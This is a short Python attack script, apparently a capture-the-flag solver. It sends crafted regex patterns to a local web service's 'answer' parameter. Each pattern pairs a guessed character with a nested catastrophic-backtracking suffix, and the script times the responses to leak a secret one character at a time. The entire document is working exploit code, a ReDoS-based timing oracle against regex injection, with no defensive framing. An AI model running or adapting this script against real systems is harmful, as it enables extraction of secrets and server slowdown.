#!/usr/bin/env python3

import requests, sys
from time import time

prefix = ''
depth = 2

if len(sys.argv) >= 3:
    depth = int(sys.argv[2])
    prefix = sys.argv[1]
elif len(sys.argv) >= 2:
    depth = int(sys.argv[1])

suffix = '(' * depth + '.' + '*)' * depth + '!'

r = []
for c in '_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-':
    begin = time()
    requests.get('http://localhost', params = {
        'answer': prefix + c + suffix
    });
    r.append([c, time() - begin])

r = sorted(r, key = lambda x: x[1])

for d in r[::-1][:3]:
    print('[*] {} : {}'.format(d[0], d[1]))
